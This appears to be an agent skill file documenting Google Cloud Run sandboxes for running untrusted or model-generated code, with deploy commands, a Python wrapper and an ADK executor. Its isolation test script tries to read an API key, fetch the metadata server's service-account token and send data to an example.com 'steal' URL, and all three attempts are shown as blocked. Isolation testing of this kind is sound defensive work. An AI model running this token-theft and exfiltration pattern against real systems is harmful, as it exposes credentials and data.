---
name: cloud-run-sandboxes
description: Use this skill when running untrusted or model-generated code safely on Google Cloud Run, building an AI code interpreter, or letting an agent execute Python it wrote without exposing your service credentials. Covers deploying a Cloud Run service with the sandbox launcher, running code in a sealed sandbox via the sandbox CLI, the deny-by-default network and per-call egress control, credential and metadata isolation, and the ADK CloudRunSandboxCodeExecutor one-liner. Tools and SDKs, gcloud beta run, the /usr/local/gcp/bin/sandbox binary, google-genai, google-adk.
---

# Cloud Run Sandboxes Skill

## Overview

Cloud Run sandboxes let a service spawn lightweight isolated execution boundaries inside its own instance to run untrusted or model-written code. One deploy flag turns a container into a sandbox host.

- Deploy a service with `--sandbox-launcher`, the `sandbox` binary appears at `/usr/local/gcp/bin/sandbox`.
- Run any code in a fresh throwaway sandbox with `sandbox do`.
- The sandbox has no env vars, no metadata server, and no outbound network by default.
- Open egress per call with `--allow-egress` when you trust the code.
- With ADK, wire it into an agent as `code_executor=CloudRunSandboxCodeExecutor()`.

> [!IMPORTANT]
> The enable flag is `--sandbox-launcher` on `gcloud beta run deploy` or `gcloud beta run services update`. Inside the container the tool is `/usr/local/gcp/bin/sandbox`, and `sandbox do -- <cmd>` creates a sandbox, runs the command, and deletes it. This is a `beta` surface, make sure your gcloud is current (see the warning below).

> [!IMPORTANT]
> The ADK executor import path is `from google.adk.integrations.cloud_run import CloudRunSandboxCodeExecutor`. As of 2026-07-11 it is only on the adk-python `main` branch, install it with `pip install "git+https://github.com/google/adk-python"`. The released `google-adk 2.4.0` does not have it, the announcement says it lands in the next version. Recheck the released version before relying on plain `pip install google-adk`.

> [!WARNING]
> Cloud Run sandboxes are in public preview under Pre-GA Offerings Terms. Environment compute shares the container CPU and memory with no premium charge during preview, that is a preview condition and can change, and you still pay for the Cloud Run instance. Do not build a production dependency on preview behavior.

> [!WARNING]
> Sandboxed code execution is not unique to Cloud Run, E2B, Modal, and Vertex AI all offer it, and ADK itself ships `e2b/` and `daytona/` executors. What is specific here is that the sandbox lives inside the Cloud Run instance you already deploy, with no separate sandbox service to run.

---

## Quick Start

### 1. Deploy a service with the sandbox launcher on

```bash
gcloud beta run deploy sandbox-demo --source . \
  --region us-central1 \
  --sandbox-launcher \
  --allow-unauthenticated \
  --set-env-vars "GEMINI_API_KEY=$GEMINI_API_KEY"
```

> [!WARNING]
> If `--sandbox-launcher` is rejected as an unknown flag, your gcloud beta component is stale, not the feature missing. The flag shipped 2026-07-10. Run `gcloud components update` and retry. Symptom, `gcloud beta run deploy --help` shows no sandbox flag on an older component.

### 2. Run code inside a sandbox from your handler

The whole trick is one subprocess call. `do` means make a fresh box, run this, throw the box away.

```python
import os, subprocess, sys, tempfile

SANDBOX = "/usr/local/gcp/bin/sandbox"
PYTHON = os.path.realpath(sys.executable)  # absolute path, see warning

def run_in_sandbox(code, allow_egress=False):
    with tempfile.NamedTemporaryFile("w", suffix=".py", dir="/tmp", delete=False) as f:
        f.write(code)
        path = f.name
    cmd = [SANDBOX, "do"]
    if allow_egress:
        cmd.append("--allow-egress")
    cmd += ["--", PYTHON, path]
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return {"stdout": proc.stdout, "stderr": proc.stderr, "returncode": proc.returncode}
```

> [!WARNING]
> The sandbox runs with an EMPTY PATH, the environment is not inherited and PATH is part of that. A bare `python3` (or any binary name) is not found. Symptom, `error finding executable "python3" in PATH []: no such file or directory` and `exit status 128`. Fix, invoke the interpreter by absolute path, `sys.executable` resolves to something like `/usr/local/bin/python3.12`. The same rule applies to any binary, pass a full path or set it with `--env`.

### 3. Prove the isolation, run code that tries to break out

Deterministic reproduction, this exact script was run in a sandbox and every boundary held.

```python
# exfil.py, run with: python sandbox_run.py --url <service> --file exfil.py
import os, urllib.request
def get(url, headers=None):
    return urllib.request.urlopen(urllib.request.Request(url, headers=headers or {}), timeout=5).read().decode()
print("GEMINI_API_KEY visible in sandbox:", "GEMINI_API_KEY" in os.environ)
try:
    get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        {"Metadata-Flavor": "Google"}); print("TOKEN LEAKED")
except Exception as e: print("metadata blocked:", type(e).__name__)
try:
    get("https://example.com/steal?data=secret"); print("EGRESS OK")
except Exception as e: print("egress blocked:", type(e).__name__)
```

Measured output, verified 2026-07-11 against a live service. The service has `GEMINI_API_KEY` in its own env, the sandboxed code cannot see it.

```
GEMINI_API_KEY visible in sandbox: False
metadata blocked: URLError
egress blocked: URLError
```

### 4. Open egress per call when you trust the code

```bash
python sandbox_run.py --url <service> --file fetch.py                 # egress OFF -> "fetch blocked: URLError"
python sandbox_run.py --url <service> --file fetch.py --allow-egress  # egress ON  -> "FETCH OK: <github zen>"
```

> [!WARNING]
> With `--allow-egress` the run can print a cosmetic teardown line on stderr, `Error: Failed to cleanup network namespace: failed to unmount netns file ...: no such file or directory`. The `returncode` is still 0 and stdout is correct, it is a preview teardown warning, not a failure.

### 5. The ADK one-liner

```python
# pip install "git+https://github.com/google/adk-python"   (main only, for now)
from google.adk.agents import Agent
from google.adk.integrations.cloud_run import CloudRunSandboxCodeExecutor

analyst_agent = Agent(
    name="cloud_run_data_analyst",
    model="gemini-2.5-flash",
    instruction="You are a data analyst. Write and execute Python to answer questions about your data safely.",
    code_executor=CloudRunSandboxCodeExecutor(),
)
```

## Workflow

For an agent using this skill against a deployed service.

1. Confirm the service URL is a Cloud Run service deployed with `--sandbox-launcher`. If none exists, deploy `scripts/service/` per Quick Start step 1.
2. To run the user's own code file in the sandbox, `python scripts/sandbox_run.py --url <service> --file <their_file.py>`. Add `--allow-egress` only if the code legitimately needs the network.
3. To let Gemini write the code for a task and run it, `python scripts/sandbox_run.py --url <service> --generate "<task>"`.
4. Report the returned `stdout`, `stderr`, and `returncode`. A blocked network or metadata read is expected isolation, not an error, unless `--allow-egress` was set.

## Dependencies and Prerequisites

- A current gcloud, `gcloud components update` if `--sandbox-launcher` is unknown.
- A Google Cloud project with billing, and the run, cloudbuild, and artifactregistry APIs enabled.
- The service container, `google-genai == 2.10.0`, `flask == 3.1.0`, `gunicorn == 23.0.0` (pinned in `scripts/service/requirements.txt`). The image must contain any interpreter the sandbox runs, this one uses `python:3.12-slim`.
- The client utility `scripts/sandbox_run.py` uses only the Python standard library, no install.
- The ADK executor, `pip install "git+https://github.com/google/adk-python"` until the next release, needs Python 3.10 or newer.

## Supporting files

- [scripts/sandbox_run.py](scripts/sandbox_run.py), the parameterized client, points at any sandbox service and runs a file or a Gemini-generated task. `python scripts/sandbox_run.py --url <service> --file exfil.py`
- [scripts/service/main.py](scripts/service/main.py), the Flask service that runs code in the sandbox, deploy with `scripts/service/Dockerfile`.
- [scripts/service/Dockerfile](scripts/service/Dockerfile) and [scripts/service/requirements.txt](scripts/service/requirements.txt), the container definition and pinned deps.
- [scripts/exfil.py](scripts/exfil.py), the break-out reproduction, proves credential, metadata, and network isolation in one run.
- [scripts/fetch.py](scripts/fetch.py), the egress toggle reproduction, blocked by default, allowed with `--allow-egress`.
- [scripts/adk_agent.py](scripts/adk_agent.py), the ADK CloudRunSandboxCodeExecutor one-liner.

## Documentation Pages

You MUST fetch the matching page below before writing code. These hosted docs are the source of truth for parameters, flags, and edge cases, do not rely solely on the examples above.

- https://docs.cloud.google.com/run/docs/code-execution
- https://docs.cloud.google.com/run/docs/configuring/services/sandboxes
- https://cloud.google.com/blog/topics/developers-practitioners/google-cloud-run-sandboxes-are-in-public-preview

## From the episode

Built live on the Friday stream, video link to follow.
